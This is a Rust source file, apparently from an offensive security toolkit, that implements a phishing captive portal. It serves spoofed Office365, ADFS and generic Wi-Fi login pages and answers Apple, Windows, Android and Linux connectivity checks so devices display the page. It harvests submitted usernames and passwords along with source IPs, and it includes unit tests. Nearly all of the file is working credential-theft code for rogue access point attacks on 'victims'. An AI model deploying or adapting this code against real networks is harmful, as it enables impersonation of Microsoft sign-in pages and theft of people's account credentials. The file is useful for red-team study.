//! Captive Portal — Form-based credential capture via spoofed login pages.
//!
//! Serves realistic-looking login pages (Generic, Office365, ADFS) to capture
//! form-submitted credentials. Also handles OS/browser captive portal detection
//! requests to ensure connectivity checks pass and the login page is displayed.
//! Useful in rogue access point / network spoofing scenarios where victims can
//! be redirected to a captive portal landing page.
//!
//! # Usage
//! ```no_run
//! use overthrone_relay::captive_portal::{CaptivePortal, CaptivePortalConfig};
//!
//! let config = CaptivePortalConfig {
//!     listen_ip: std::net::IpAddr::V4(std::net::Ipv4Addr::new(0, 0, 0, 0)),
//!     listen_port: 8080,
//!     ..CaptivePortalConfig::default()
//! };
//! let mut portal = CaptivePortal::new(config);
//! portal.start().unwrap();
//! println!("Captured: {}", portal.captured_count());
//! portal.stop().unwrap();
//! ```

use rustls::ServerConfig;
use rustls::pki_types::CertificateDer;
use std::fmt;
use std::io::{Read, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use tracing::{debug, info, warn};

/// Captive portal page template style
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CaptivePortalTemplate {
    Generic,
    Office365,
    Adfs,
}

impl fmt::Display for CaptivePortalTemplate {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Generic => write!(f, "Generic"),
            Self::Office365 => write!(f, "Office365"),
            Self::Adfs => write!(f, "ADFS"),
        }
    }
}

/// Captured form credential
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct CapturedFormCredential {
    pub username: String,
    pub domain: String,
    pub password: String,
    pub source_ip: String,
    pub timestamp: chrono::DateTime<chrono::Utc>,
    pub user_agent: String,
}

impl CapturedFormCredential {
    /// Format as hashcat-style username:domain:password
    pub fn to_hashcat_format(&self) -> String {
        format!("{}:{}:{}", self.username, self.domain, self.password)
    }
}

impl fmt::Display for CapturedFormCredential {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "[FORM] {}\\{} : {} (from {})",
            self.domain, self.username, self.password, self.source_ip
        )
    }
}

/// Configuration for the captive portal server
#[derive(Debug, Clone)]
pub struct CaptivePortalConfig {
    pub listen_ip: IpAddr,
    pub listen_port: u16,
    pub https: bool,
    pub cert_path: Option<String>,
    pub key_path: Option<String>,
    pub domain: String,
    pub company_name: String,
    pub banner_color: String,
    pub logo_url: Option<String>,
    pub target_url: Option<String>,
    pub template: CaptivePortalTemplate,
}

impl Default for CaptivePortalConfig {
    fn default() -> Self {
        Self {
            listen_ip: IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)),
            listen_port: 8080,
            https: false,
            cert_path: None,
            key_path: None,
            domain: "corp.local".to_string(),
            company_name: "Corporate".to_string(),
            banner_color: "#0078D4".to_string(),
            logo_url: None,
            target_url: None,
            template: CaptivePortalTemplate::Generic,
        }
    }
}

/// Captive portal HTTP server for form-based credential capture
pub struct CaptivePortal {
    config: CaptivePortalConfig,
    listener: Option<TcpListener>,
    running: Arc<AtomicBool>,
    credentials: Arc<Mutex<Vec<CapturedFormCredential>>>,
    handle: Option<thread::JoinHandle<()>>,
}

impl CaptivePortal {
    pub fn new(config: CaptivePortalConfig) -> Self {
        Self {
            config,
            listener: None,
            running: Arc::new(AtomicBool::new(false)),
            credentials: Arc::new(Mutex::new(Vec::new())),
            handle: None,
        }
    }

    pub fn start(&mut self) -> Result<(), String> {
        let addr = format!("{}:{}", self.config.listen_ip, self.config.listen_port);
        let listener = TcpListener::bind(&addr)
            .map_err(|e| format!("Failed to bind captive portal to {addr}: {e}"))?;
        listener
            .set_nonblocking(true)
            .map_err(|e| format!("Failed to set non-blocking: {e}"))?;

        // Build TLS server config if HTTPS mode is enabled
        let tls_config: Option<Arc<ServerConfig>> = if self.config.https {
            let cert_path = self
                .config
                .cert_path
                .as_deref()
                .ok_or_else(|| "HTTPS enabled but no cert_path set".to_string())?;
            let key_path = self
                .config
                .key_path
                .as_deref()
                .ok_or_else(|| "HTTPS enabled but no key_path set".to_string())?;

            let certs: Vec<CertificateDer> = rustls_pemfile::certs(&mut std::io::BufReader::new(
                std::fs::File::open(cert_path)
                    .map_err(|e| format!("Failed to open TLS cert '{cert_path}': {e}"))?,
            ))
            .collect::<std::result::Result<Vec<_>, _>>()
            .map_err(|e| format!("Failed to parse TLS cert PEM: {e}"))?;

            if certs.is_empty() {
                return Err("No certificates found in TLS cert file".to_string());
            }

            let key = rustls_pemfile::private_key(&mut std::io::BufReader::new(
                std::fs::File::open(key_path)
                    .map_err(|e| format!("Failed to open TLS key '{key_path}': {e}"))?,
            ))
            .map_err(|e| format!("Failed to parse TLS key PEM: {e}"))?
            .ok_or_else(|| "No private key found in TLS key file".to_string())?;

            let provider = Arc::new(rustls::crypto::ring::default_provider());
            let server_config = ServerConfig::builder_with_provider(provider)
                .with_protocol_versions(&[&rustls::version::TLS12, &rustls::version::TLS13])
                .map_err(|e| format!("TLS protocol version error: {e}"))?
                .with_no_client_auth()
                .with_single_cert(certs, key)
                .map_err(|e| format!("TLS cert/key error: {e}"))?;

            info!("Captive portal HTTPS mode with cert={cert_path}");
            Some(Arc::new(server_config))
        } else {
            info!("Captive portal listening on http://{addr}");
            None
        };

        self.listener =
            Some(listener.try_clone().map_err(|e| {
                format!("Captive portal failed to clone listener for storage: {e}")
            })?);
        self.running.store(true, Ordering::SeqCst);

        let running = self.running.clone();
        let credentials = self.credentials.clone();
        let config = self.config.clone();
        let listener = self
            .listener
            .as_ref()
            .ok_or_else(|| {
                "Captive portal listener was not initialized — call bind() before start()"
                    .to_string()
            })?
            .try_clone()
            .map_err(|e| format!("Captive portal failed to clone listener for accept loop: {e}"))?;
        let listen_addr = listener.local_addr().ok();

        let handle = thread::spawn(move || {
            loop {
                if !running.load(Ordering::SeqCst) {
                    break;
                }
                match listener.accept() {
                    Ok((stream, _)) => {
                        let creds = credentials.clone();
                        let cfg = config.clone();
                        let tls = tls_config.clone();
                        thread::spawn(move || {
                            let stream_type = if let Some(ref tls_cfg) = tls {
                                match wrap_tls_stream(stream, tls_cfg) {
                                    Ok(s) => s,
                                    Err(e) => {
                                        debug!("TLS handshake failed: {e}");
                                        return;
                                    }
                                }
                            } else {
                                StreamType::Plain(stream)
                            };
                            handle_client(stream_type, &cfg, &creds);
                        });
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(50));
                    }
                    Err(e) => {
                        if running.load(Ordering::SeqCst) {
                            warn!("Captive portal accept error: {e}");
                        }
                        thread::sleep(Duration::from_millis(100));
                    }
                }
            }
            // Graceful shutdown: send a connection to unblock the listener.
            // Use 127.0.0.1 instead of the bound IP (which may be 0.0.0.0 on Windows).
            if let Some(addr) = listen_addr {
                let shutdown_addr = SocketAddr::new(Ipv4Addr::LOCALHOST.into(), addr.port());
                let _ = std::net::TcpStream::connect_timeout(
                    &shutdown_addr,
                    Duration::from_millis(100),
                );
            }
        });

        self.handle = Some(handle);
        Ok(())
    }

    pub fn stop(&mut self) -> Result<(), String> {
        self.running.store(false, Ordering::SeqCst);
        // Connect to self to unblock the accept loop on the child thread.
        // Use 127.0.0.1 instead of the bound IP (which may be 0.0.0.0 on Windows).
        if let Some(ref listener) = self.listener
            && let Ok(addr) = listener.local_addr()
        {
            let shutdown_addr = SocketAddr::new(Ipv4Addr::LOCALHOST.into(), addr.port());
            let _ =
                std::net::TcpStream::connect_timeout(&shutdown_addr, Duration::from_millis(200));
        }
        self.listener = None;
        if let Some(handle) = self.handle.take() {
            let _ = handle.join();
        }
        info!("Captive portal stopped");
        Ok(())
    }

    pub fn captured_credentials(&self) -> Vec<CapturedFormCredential> {
        self.credentials
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .clone()
    }

    pub fn captured_count(&self) -> usize {
        self.credentials.lock().map(|g| g.len()).unwrap_or(0)
    }
}

fn handle_client(
    mut stream_type: StreamType,
    config: &CaptivePortalConfig,
    credentials: &Arc<Mutex<Vec<CapturedFormCredential>>>,
) {
    let peer = stream_type.peer_addr().ok();
    let source_ip = peer
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".to_string());

    let mut buf = [0u8; 8192];
    let bytes_read = match stream_type.read(&mut buf) {
        Ok(n) if n > 0 => n,
        Ok(_) => return,
        Err(e) => {
            debug!("Captive portal read error from {source_ip}: {e}");
            return;
        }
    };

    let request = String::from_utf8_lossy(&buf[..bytes_read]);

    let user_agent = request
        .lines()
        .find_map(|line| {
            if line.to_ascii_lowercase().starts_with("user-agent:") {
                Some(line["user-agent:".len()..].trim().to_string())
            } else {
                None
            }
        })
        .unwrap_or_default();

    // Check if this is a captive portal detection request
    if let Some(detection_response) = handle_detection_request(&request) {
        let _ = stream_type.write_all(&detection_response);
        return;
    }

    if request.starts_with("POST") {
        if let Some(cred) = parse_form_post(&request) {
            let captured = CapturedFormCredential {
                username: cred.0,
                domain: config.domain.clone(),
                password: cred.1,
                source_ip: source_ip.clone(),
                timestamp: chrono::Utc::now(),
                user_agent: user_agent.clone(),
            };
            info!("{}", captured);
            if let Ok(mut guard) = credentials.lock() {
                guard.push(captured);
            }
            let redirect = config
                .target_url
                .as_deref()
                .unwrap_or("http://captive.apple.com");
            let response = build_redirect_response(redirect);
            let _ = stream_type.write_all(&response);
        }
    } else {
        let body = render_page(config);
        let response = build_html_response(&body);
        let _ = stream_type.write_all(&response);
    }
}

/// Check if the request targets a known OS/browser captive portal detection URL.
/// Returns `Some(response_bytes)` if matched, `None` to continue normal handling.
fn handle_detection_request(request: &str) -> Option<Vec<u8>> {
    let request_line = request.lines().next()?;
    let parts: Vec<&str> = request_line.split_whitespace().collect();
    if parts.len() < 2 {
        return None;
    }
    let method = parts[0];
    if method != "GET" {
        return None;
    }
    let path = parts[1];

    // Extract the Host header to build the full requested URL
    let host = request
        .lines()
        .find_map(|line| {
            if line.to_ascii_lowercase().starts_with("host:") {
                Some(line["host:".len()..].trim().to_lowercase())
            } else {
                None
            }
        })
        .unwrap_or_default();

    // Apple: captive.apple.com/library/test/success.html
    if path == "/library/test/success.html" && host.contains("captive.apple.com") {
        return Some(build_success_response("Success"));
    }

    // Windows: www.msftconnecttest.com/connecttest.txt
    if path == "/connecttest.txt" && host.contains("msftconnecttest.com") {
        return Some(build_success_response("Microsoft Connect Test"));
    }

    // Windows 11: www.msftncsi.com/ncsi.txt
    if path == "/ncsi.txt" && host.contains("msftncsi.com") {
        return Some(build_success_response("Microsoft NCSI"));
    }

    // Android: connectivitycheck.gstatic.com/generate_204
    if path == "/generate_204" && host.contains("gstatic.com") {
        return Some(generate_204_response());
    }

    // Google Chrome: clients3.google.com/generate_204
    if path == "/generate_204" && host.contains("google.com") {
        return Some(generate_204_response());
    }

    // Linux NetworkManager: nmcheck.gnome.org/check_network_status.txt
    if path == "/check_network_status.txt" && host.contains("nmcheck.gnome.org") {
        return Some(build_success_response("NetworkManager is online"));
    }

    // Generic /generate_204 endpoint
    if path == "/generate_204" {
        return Some(generate_204_response());
    }

    None
}

fn build_success_response(body: &str) -> Vec<u8> {
    let headers = format!(
        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\nCache-Control: no-cache\r\n\r\n",
        body.len()
    );
    let mut response = headers.into_bytes();
    response.extend_from_slice(body.as_bytes());
    response
}

fn generate_204_response() -> Vec<u8> {
    "HTTP/1.1 204 No Content\r\nConnection: close\r\n\r\n"
        .to_string()
        .into_bytes()
}

/// Wrap a TCP stream with TLS using the given server config.
/// Performs the TLS handshake synchronously.
fn wrap_tls_stream(
    mut stream: TcpStream,
    server_config: &Arc<ServerConfig>,
) -> Result<StreamType, String> {
    let mut conn = rustls::ServerConnection::new(server_config.clone())
        .map_err(|e| format!("Failed to create TLS server connection: {e}"))?;

    loop {
        match conn.complete_io(&mut stream) {
            Ok(_) if conn.is_handshaking() => continue,
            Ok(_) => break,
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                thread::sleep(Duration::from_millis(10));
                continue;
            }
            Err(e) => return Err(format!("TLS handshake failed: {e}")),
        }
    }

    Ok(StreamType::Tls(Box::new(TlsStreamAdapter { conn, stream })))
}

/// Combined TCP or TLS stream for use with handle_client
enum StreamType {
    /// Plain TCP connection (no TLS)
    Plain(TcpStream),
    /// TLS-wrapped TCP connection
    Tls(Box<TlsStreamAdapter>),
}

impl StreamType {
    fn peer_addr(&self) -> std::io::Result<std::net::SocketAddr> {
        match self {
            StreamType::Plain(s) => s.peer_addr(),
            StreamType::Tls(t) => t.stream.peer_addr(),
        }
    }
}

impl Read for StreamType {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        match self {
            StreamType::Plain(s) => s.read(buf),
            StreamType::Tls(t) => t.read(buf),
        }
    }
}

impl Write for StreamType {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        match self {
            StreamType::Plain(s) => s.write(buf),
            StreamType::Tls(t) => t.write(buf),
        }
    }

    fn flush(&mut self) -> std::io::Result<()> {
        match self {
            StreamType::Plain(s) => s.flush(),
            StreamType::Tls(t) => t.flush(),
        }
    }
}

/// Adapter that bridges a rustls `ServerConnection` with a `TcpStream`
/// to provide a combined `Read + Write` type for use with handle_client.
struct TlsStreamAdapter {
    conn: rustls::ServerConnection,
    pub(super) stream: TcpStream,
}

impl Read for TlsStreamAdapter {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        let mut reader = self.conn.reader();
        match reader.read(buf) {
            Ok(0) => {
                self.conn
                    .read_tls(&mut self.stream)
                    .map_err(std::io::Error::other)?;
                self.conn
                    .process_new_packets()
                    .map_err(std::io::Error::other)?;
                self.conn.reader().read(buf)
            }
            other => other,
        }
    }
}

impl Write for TlsStreamAdapter {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let n = self.conn.writer().write(buf)?;
        self.conn
            .write_tls(&mut self.stream)
            .map_err(std::io::Error::other)?;
        Ok(n)
    }

    fn flush(&mut self) -> std::io::Result<()> {
        self.conn
            .write_tls(&mut self.stream)
            .map_err(std::io::Error::other)?;
        self.stream.flush()
    }
}

fn parse_form_post(request: &str) -> Option<(String, String)> {
    let body_start = request.find("\r\n\r\n")?;
    let body = &request[body_start + 4..];

    if body.is_empty() {
        return None;
    }

    let body = body.trim_end_matches('\0');

    let mut username = None;
    let mut password = None;

    for pair in body.split('&') {
        let mut parts = pair.splitn(2, '=');
        let key = parts.next()?;
        let value = url_decode(parts.next().unwrap_or(""));

        let key_lower = key.to_ascii_lowercase();
        match key_lower.as_str() {
            "username" | "user" | "email" | "loginfmt" | "login" => {
                username = Some(value);
            }
            "password" | "passwd" | "pass" => {
                password = Some(value);
            }
            _ => {}
        }
    }

    match (username, password) {
        (Some(u), Some(p)) if !u.is_empty() && !p.is_empty() => Some((u, p)),
        _ => None,
    }
}

fn url_decode(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    let mut chars = input.chars();
    while let Some(c) = chars.next() {
        if c == '+' {
            result.push(' ');
        } else if c == '%' {
            let hi = chars.next().and_then(|c| c.to_digit(16)).unwrap_or(0);
            let lo = chars.next().and_then(|c| c.to_digit(16)).unwrap_or(0);
            result.push(char::from((hi * 16 + lo) as u8));
        } else {
            result.push(c);
        }
    }
    result
}

fn render_page(config: &CaptivePortalConfig) -> String {
    match config.template {
        CaptivePortalTemplate::Office365 => render_office365_page(config),
        CaptivePortalTemplate::Adfs => render_adfs_page(config),
        CaptivePortalTemplate::Generic => render_generic_page(config),
    }
}

fn render_generic_page(config: &CaptivePortalConfig) -> String {
    let logo_html = match &config.logo_url {
        Some(url) => format!(
            r#"<div class="logo"><img src="{}" alt="Logo" style="max-height:60px;"></div>"#,
            url
        ),
        None => String::new(),
    };

    format!(
        r#"<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{company} Network Login</title>
<style>
  * {{ margin:0; padding:0; box-sizing:border-box; }}
  body {{ font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }}
  .card {{ background:#fff; border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,0.15); padding:40px; width:400px; max-width:90vw; }}
  .banner {{ background:{banner_color}; color:#fff; text-align:center; padding:12px; border-radius:8px 8px 0 0; margin:-40px -40px 24px -40px; font-size:14px; font-weight:600; }}
  .logo {{ text-align:center; margin-bottom:20px; }}
  h1 {{ font-size:22px; font-weight:600; color:#1a1a1a; margin-bottom:8px; text-align:center; }}
  p {{ color:#666; font-size:14px; margin-bottom:24px; text-align:center; }}
  label {{ display:block; font-size:13px; font-weight:600; color:#333; margin-bottom:4px; }}
  input[type="text"], input[type="password"] {{ width:100%; padding:10px 12px; border:1px solid #ccc; border-radius:4px; font-size:14px; margin-bottom:16px; transition:border-color 0.2s; }}
  input[type="text"]:focus, input[type="password"]:focus {{ outline:none; border-color:{banner_color}; box-shadow:0 0 0 2px rgba(0,120,212,0.2); }}
  button {{ width:100%; padding:10px; background:{banner_color}; color:#fff; border:none; border-radius:4px; font-size:15px; font-weight:600; cursor:pointer; }}
  button:hover {{ opacity:0.9; }}
  .footer {{ text-align:center; margin-top:16px; font-size:12px; color:#999; }}
</style>
</head>
<body>
<div class="card">
  <div class="banner">Wi-Fi Network Access</div>
  {logo_html}
  <h1>Sign In</h1>
  <p>Please enter your {company} credentials to access the network.</p>
  <form method="POST" action="/login">
    <label for="username">Username</label>
    <input type="text" id="username" name="username" placeholder="domain\username" required autofocus>
    <label for="password">Password</label>
    <input type="password" id="password" name="password" placeholder="Enter your password" required>
    <button type="submit">Sign In</button>
  </form>
  <div class="footer">Protected by {company} Network Access Control</div>
</div>
</body>
</html>"#,
        company = config.company_name,
        banner_color = config.banner_color,
    )
}

fn render_office365_page(config: &CaptivePortalConfig) -> String {
    let logo_html = match &config.logo_url {
        Some(url) => format!(
            r#"<img src="{}" alt="Logo" style="max-height:48px; margin-bottom:16px;">"#,
            url
        ),
        None => r##"<svg width="48" height="48" viewBox="0 0 48 48" fill="none" style="margin-bottom:16px;"><rect width="48" height="48" rx="8" fill="#0078D4"/><text x="24" y="30" text-anchor="middle" fill="white" font-size="22" font-weight="bold" font-family="Arial">M</text></svg>"##.to_string(),
    };

    format!(
        r##"<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<style>
  * {{ margin:0; padding:0; box-sizing:border-box; }}
  body {{ font-family:"Segoe UI",-apple-system,Roboto,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }}
  .card {{ background:#fff; border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,0.12); padding:44px; width:440px; max-width:90vw; text-align:center; }}
  h1 {{ font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }}
  .subtitle {{ font-size:14px; color:#666; margin-bottom:28px; }}
  .field {{ text-align:left; margin-bottom:16px; }}
  label {{ display:block; font-size:13px; font-weight:600; color:#333; margin-bottom:4px; }}
  input[type="text"], input[type="password"] {{ width:100%; padding:10px 12px; border:1px solid #8b8b8b; border-radius:4px; font-size:14px; }}
  input[type="text"]:focus, input[type="password"]:focus {{ outline:none; border-color:#0067b8; box-shadow:0 0 0 1px #0067b8; }}
  button {{ width:100%; padding:10px; background:#0067b8; color:#fff; border:none; border-radius:4px; font-size:15px; font-weight:600; cursor:pointer; margin-top:8px; }}
  button:hover {{ background:#005a9e; }}
  a {{ color:#0067b8; font-size:13px; text-decoration:none; display:inline-block; margin-top:12px; }}
  a:hover {{ text-decoration:underline; }}
  .footer {{ margin-top:24px; font-size:12px; color:#999; }}
</style>
</head>
<body>
<div class="card">
  <div class="logo">{logo_html}</div>
  <h1>Sign in to your account</h1>
  <p class="subtitle">{company}</p>
  <form method="POST" action="/login">
    <div class="field">
      <label for="loginfmt">Email or phone</label>
      <input type="text" id="loginfmt" name="loginfmt" placeholder="someone@example.com" required autofocus>
    </div>
    <div class="field">
      <label for="passwd">Password</label>
      <input type="password" id="passwd" name="passwd" placeholder="Password" required>
    </div>
    <button type="submit">Sign in</button>
  </form>
  <a href="#">Forgot my password</a>
  <div class="footer">&copy; Microsoft 2025</div>
</div>
</body>
</html>"##,
        logo_html = logo_html,
        company = config.company_name,
    )
}

fn render_adfs_page(config: &CaptivePortalConfig) -> String {
    let logo_html = match &config.logo_url {
        Some(url) => format!(
            r#"<img src="{}" alt="Logo" style="max-height:48px; margin-bottom:16px;">"#,
            url
        ),
        None => String::new(),
    };

    format!(
        r##"<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AD FS - Sign In</title>
<style>
  * {{ margin:0; padding:0; box-sizing:border-box; }}
  body {{ font-family:"Segoe UI",-apple-system,Roboto,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }}
  .card {{ background:#fff; border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,0.12); padding:44px; width:480px; max-width:90vw; }}
  .header {{ border-bottom:1px solid #e0e0e0; padding-bottom:16px; margin-bottom:24px; text-align:center; }}
  .header h1 {{ font-size:20px; font-weight:600; color:#333; }}
  .header p {{ font-size:13px; color:#666; margin-top:4px; }}
  .field {{ margin-bottom:16px; }}
  label {{ display:block; font-size:13px; font-weight:600; color:#333; margin-bottom:4px; }}
  input[type="text"], input[type="password"] {{ width:100%; padding:10px 12px; border:1px solid #ccc; border-radius:4px; font-size:14px; }}
  input[type="text"]:focus, input[type="password"]:focus {{ outline:none; border-color:#0078D4; }}
  .hint {{ font-size:12px; color:#888; margin-top:2px; }}
  button {{ width:100%; padding:10px; background:#0078D4; color:#fff; border:none; border-radius:4px; font-size:15px; font-weight:600; cursor:pointer; }}
  button:hover {{ background:#106ebe; }}
  .options {{ display:flex; justify-content:space-between; margin-top:12px; font-size:13px; }}
  .options a {{ color:#0078D4; text-decoration:none; }}
  .options a:hover {{ text-decoration:underline; }}
  .footer {{ margin-top:20px; font-size:11px; color:#aaa; text-align:center; border-top:1px solid #e0e0e0; padding-top:16px; }}
</style>
</head>
<body>
<div class="card">
  <div class="header">
    {logo_html}
    <h1>Sign in with your organizational account</h1>
    <p>{company} Active Directory Federation Services</p>
  </div>
  <form method="POST" action="/login">
    <div class="field">
      <label for="username">User name</label>
      <input type="text" id="username" name="username" placeholder="user@corp.local" required autofocus>
      <div class="hint">example: user@{domain}</div>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Password" required>
    </div>
    <button type="submit">Sign In</button>
  </form>
  <div class="options">
    <a href="#">Sign in with Windows Hello</a>
    <a href="#">Certificate authentication</a>
  </div>
  <div class="footer">AD FS | {company}</div>
</div>
</body>
</html>"##,
        logo_html = logo_html,
        company = config.company_name,
        domain = config.domain,
    )
}

fn build_html_response(body: &str) -> Vec<u8> {
    let headers = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nConnection: close\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nX-Content-Type-Options: nosniff\r\n\r\n",
        body.len()
    );
    let mut response = headers.into_bytes();
    response.extend_from_slice(body.as_bytes());
    response
}

fn build_redirect_response(target: &str) -> Vec<u8> {
    let body = format!(
        r#"<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url={}"></head><body></body></html>"#,
        target
    );
    let headers = format!(
        "HTTP/1.1 302 Found\r\nLocation: {}\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        target,
        body.len()
    );
    let mut response = headers.into_bytes();
    response.extend_from_slice(body.as_bytes());
    response
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_captive_portal_config_default() {
        let config = CaptivePortalConfig::default();
        assert_eq!(config.listen_ip, IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)));
        assert_eq!(config.listen_port, 8080);
        assert!(!config.https);
        assert!(config.cert_path.is_none());
        assert!(config.key_path.is_none());
        assert_eq!(config.domain, "corp.local");
        assert_eq!(config.company_name, "Corporate");
        assert_eq!(config.banner_color, "#0078D4");
        assert!(config.logo_url.is_none());
        assert!(config.target_url.is_none());
        assert_eq!(config.template, CaptivePortalTemplate::Generic);
    }

    #[test]
    fn test_captive_portal_config_custom() {
        let config = CaptivePortalConfig {
            listen_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
            listen_port: 8888,
            https: true,
            cert_path: Some("/tmp/cert.pem".to_string()),
            key_path: Some("/tmp/key.pem".to_string()),
            domain: "test.lab".to_string(),
            company_name: "TestCorp".to_string(),
            banner_color: "#FF0000".to_string(),
            logo_url: Some("http://logo.test/logo.png".to_string()),
            target_url: Some("http://success.test".to_string()),
            template: CaptivePortalTemplate::Office365,
        };
        assert_eq!(config.listen_ip.to_string(), "10.0.0.1");
        assert_eq!(config.listen_port, 8888);
        assert!(config.https);
        assert_eq!(config.cert_path.as_deref(), Some("/tmp/cert.pem"));
        assert_eq!(config.key_path.as_deref(), Some("/tmp/key.pem"));
        assert_eq!(config.domain, "test.lab");
        assert_eq!(config.company_name, "TestCorp");
        assert_eq!(config.banner_color, "#FF0000");
        assert_eq!(
            config.logo_url.as_deref(),
            Some("http://logo.test/logo.png")
        );
        assert_eq!(config.target_url.as_deref(), Some("http://success.test"));
        assert_eq!(config.template, CaptivePortalTemplate::Office365);
    }

    #[test]
    fn test_template_display() {
        assert_eq!(CaptivePortalTemplate::Generic.to_string(), "Generic");
        assert_eq!(CaptivePortalTemplate::Office365.to_string(), "Office365");
        assert_eq!(CaptivePortalTemplate::Adfs.to_string(), "ADFS");
    }

    #[test]
    fn test_captured_credential_defaults() {
        let cred = CapturedFormCredential {
            username: "jsmith".to_string(),
            domain: "CORP".to_string(),
            password: "P@ssw0rd!".to_string(),
            source_ip: "192.168.1.100".to_string(),
            timestamp: chrono::Utc::now(),
            user_agent: "Mozilla/5.0".to_string(),
        };
        assert_eq!(cred.username, "jsmith");
        assert_eq!(cred.domain, "CORP");
        assert_eq!(cred.password, "P@ssw0rd!");
        assert_eq!(cred.source_ip, "192.168.1.100");
        assert_eq!(cred.user_agent, "Mozilla/5.0");
    }

    #[test]
    fn test_parse_form_post_basic() {
        let body = "username=jsmith&password=P%40ssw0rd%21";
        let request = format!(
            "POST /login HTTP/1.1\r\nHost: test\r\nContent-Length: {}\r\n\r\n{}",
            body.len(),
            body
        );
        let result = parse_form_post(&request);
        assert!(result.is_some());
        let (user, pass) = result.unwrap();
        assert_eq!(user, "jsmith");
        assert_eq!(pass, "P@ssw0rd!");
    }

    #[test]
    fn test_parse_form_post_variant_names() {
        let cases = vec![
            ("user=admin&password=secret", ("admin", "secret")),
            (
                "email=admin@test.com&pass=sekret",
                ("admin@test.com", "sekret"),
            ),
            ("login=root&passwd=toor", ("root", "toor")),
            (
                "loginfmt=user@corp.com&passwd=letmein",
                ("user@corp.com", "letmein"),
            ),
        ];
        for (body, expected) in cases {
            let request = format!("POST /login HTTP/1.1\r\nHost: test\r\n\r\n{}", body);
            let result = parse_form_post(&request);
            assert!(result.is_some(), "Failed for body: {body}");
            let (user, pass) = result.unwrap();
            assert_eq!(user, expected.0, "Username mismatch for body: {body}");
            assert_eq!(pass, expected.1, "Password mismatch for body: {body}");
        }
    }

    #[test]
    fn test_parse_form_post_missing_field() {
        let request = "POST /login HTTP/1.1\r\nHost: test\r\n\r\nusername=jsmith&other=value";
        assert!(parse_form_post(request).is_none());
    }

    #[test]
    fn test_parse_form_post_empty_body() {
        let request = "POST /login HTTP/1.1\r\nHost: test\r\n\r\n";
        assert!(parse_form_post(request).is_none());
    }

    #[test]
    fn test_render_generic_template_contains_form() {
        let config = CaptivePortalConfig::default();
        let html = render_page(&config);
        assert!(html.contains("<form"));
        assert!(html.contains("method=\"POST\""));
        assert!(html.contains("action=\"/login\""));
        assert!(html.contains("Wi-Fi Network Access"));
        assert!(html.contains("Sign In"));
    }

    #[test]
    fn test_render_office365_template_contains_microsoft() {
        let config = CaptivePortalConfig {
            template: CaptivePortalTemplate::Office365,
            ..CaptivePortalConfig::default()
        };
        let html = render_page(&config);
        assert!(html.contains("<form"));
        assert!(html.contains("Sign in to your account"));
        assert!(html.contains("Microsoft"));
        assert!(html.contains("loginfmt"));
    }

    #[test]
    fn test_render_adfs_template_contains_organization() {
        let config = CaptivePortalConfig {
            template: CaptivePortalTemplate::Adfs,
            ..CaptivePortalConfig::default()
        };
        let html = render_page(&config);
        assert!(html.contains("<form"));
        assert!(html.contains("Sign in with your organizational account"));
        assert!(html.contains("Active Directory Federation Services"));
        assert!(html.contains("corp.local"));
    }

    #[test]
    fn test_captured_credential_hashcat_format() {
        let cred = CapturedFormCredential {
            username: "jsmith".to_string(),
            domain: "CORP".to_string(),
            password: "P@ssw0rd!".to_string(),
            source_ip: "192.168.1.100".to_string(),
            timestamp: chrono::Utc::now(),
            user_agent: String::new(),
        };
        assert_eq!(cred.to_hashcat_format(), "jsmith:CORP:P@ssw0rd!");
    }

    #[test]
    fn test_captured_credential_to_string() {
        let cred = CapturedFormCredential {
            username: "jsmith".to_string(),
            domain: "CORP".to_string(),
            password: "P@ssw0rd!".to_string(),
            source_ip: "192.168.1.100".to_string(),
            timestamp: chrono::Utc::now(),
            user_agent: String::new(),
        };
        let display = cred.to_string();
        assert!(display.contains("[FORM]"));
        assert!(display.contains("CORP\\jsmith"));
